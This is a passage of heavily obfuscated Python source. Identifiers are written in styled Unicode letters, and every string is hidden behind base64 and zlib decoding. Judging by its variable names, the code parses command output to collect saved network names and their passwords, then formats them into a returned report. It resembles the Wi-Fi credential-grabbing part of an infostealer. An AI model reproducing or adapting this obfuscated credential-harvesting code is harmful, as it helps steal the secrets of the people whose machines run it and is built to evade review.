                    𝗿𝗲𝘀𝙪𝙡𝙩𝘀 = [𝙗.split(__𝙞𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝙞𝙣𝘵.from_bytes(𝗺𝘢𝗽(lambda O, i: 664 - (𝙞𝗻𝘁(𝙊) + 𝗶), 𝗺𝘢𝗽(__𝗶𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘁𝙚𝘳(__𝙞𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xcb\x8a\xac\x02\x00\x03\xa6\x01\x8c')).decode())] * 3)), 𝗿𝘢𝘯𝗴𝗲(1)), __𝗶𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝗶𝗻𝘁.from_bytes(𝘮𝗮𝘱(lambda O, i: 925 - (𝘪𝗻𝙩(𝗢) + 𝘪), 𝙢𝘢𝗽(__𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝗶𝘵𝗲𝗿(__𝘪𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0f\xf14\x00\x00\x02\xfe\x01\x1d')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝘦(1)), __𝘪𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝘪𝗻𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 456 - (𝙞𝙣𝙩(𝘖) + 𝘪), 𝙢𝘢𝙥(__𝗶𝗺𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝙞𝘁𝗲𝙧(__𝘪𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3s\t5\x04\x00\x02\xe3\x01\x19')).decode())] * 3)), 𝗿𝘢𝙣𝙜𝗲(1)), __𝙞𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝙗 in 𝗿𝗲𝙨𝙪𝗹𝘁𝘀 if __𝘪𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x0b6\n3\xf5t\xf5+K\xca\x0b\xcaI\xca\x0b\xb4\x05\x00*\xf3\x05O')).decode() in 𝗯]
                except 𝘴𝙪𝘣𝙥𝘳𝙤𝙘𝗲𝘴𝙨.CalledProcessError:
                    𝙣𝙚𝘵𝘄𝙤𝗿𝘬𝙨.append((𝗻𝗮𝘮𝘦, __𝘪𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
                    continue
                try:
                    𝙣𝘦𝘁𝙬𝗼𝗿𝘬𝘀.append((𝙣𝗮𝘮𝘦, 𝙧𝙚𝘀𝙪𝙡𝘵𝘀[𝘪𝗻𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 468 - (𝙞𝘯𝙩(𝗢) + 𝘪), 𝙢𝙖𝙥(__𝙞𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝗶𝘵𝘦𝘳(__𝙞𝙢𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝗻𝗴𝗲(0)), __𝗶𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
                except 𝙄𝘯𝗱𝙚𝙭𝗘𝗿𝙧𝗼𝗿:
                    𝗻𝙚𝘁𝙬𝘰𝙧𝗸𝙨.append((𝗻𝙖𝘮𝘦, __𝘪𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
        except 𝘴𝘂𝘣𝗽𝘳𝗼𝘤𝙚𝙨𝘴.CalledProcessError:
            pass
        except 𝙐𝗻𝙞𝗰𝘰𝗱𝗲𝘿𝙚𝙘𝙤𝙙𝗲𝗘𝘳𝙧𝗼𝙧:
            pass
        𝘰𝘶𝙩 += __𝘪𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(__𝗶𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0b5\xf4\xf3\nr\xb4\xb5\x05\x00\n\x0f\x02,')).decode(), __𝘪𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0buu\x0b\t5L\t\x08\xcd\x0e\xb4\x05\x00\x18\n\x03\xbd')).decode())
        𝗼𝘂𝙩 += __𝘪𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK56\xb4H56\xf0\x06\x00\t\xab\x02\x15')).decode().format(__𝗶𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝗶𝙣𝙩.from_bytes(𝘮𝘢𝗽(lambda O, i: 769 - (𝗶𝗻𝘵(𝗢) + 𝗶), 𝙢𝘢𝙥(__𝙞𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝗶𝘁𝙚𝙧(__𝘪𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xab\n4\x05\x00\x03\x81\x01O')).decode())] * 3)), 𝗿𝘢𝗻𝙜𝙚(1)), __𝘪𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), __𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝘪𝙣𝘁.from_bytes(𝗺𝙖𝗽(lambda O, i: 864 - (𝘪𝙣𝙩(𝙊) + 𝙞), 𝙢𝙖𝙥(__𝘪𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝘪𝙩𝗲𝘳(__𝘪𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3w\xf15\x04\x00\x02\xd7\x01\x12')).decode())] * 3)), 𝗿𝗮𝘯𝘨𝗲(1)), __𝗶𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        for (𝙣𝙖𝗺𝘦, 𝗽𝘢𝘴𝘀𝙬𝗼𝗿𝗱) in 𝙣𝙚𝙩𝘸𝗼𝗿𝙠𝙨:
            𝘰𝘶𝘁 += __𝙞𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(𝙣𝙖𝘮𝘦, 𝗽𝗮𝘀𝙨𝘸𝗼𝗿𝗱)
        return (__𝙞𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcf\xf3+\x8822\xcdHr\xb3\xacJ\xf1\xf0\xcaI\xcaM1Ht\xc9O\x0f3\xcaqO\x0c\xb4\xb5\x05\x00\xb2\xb7\n\xa7')).decode(), __𝗶𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝗼𝘶𝘵), False)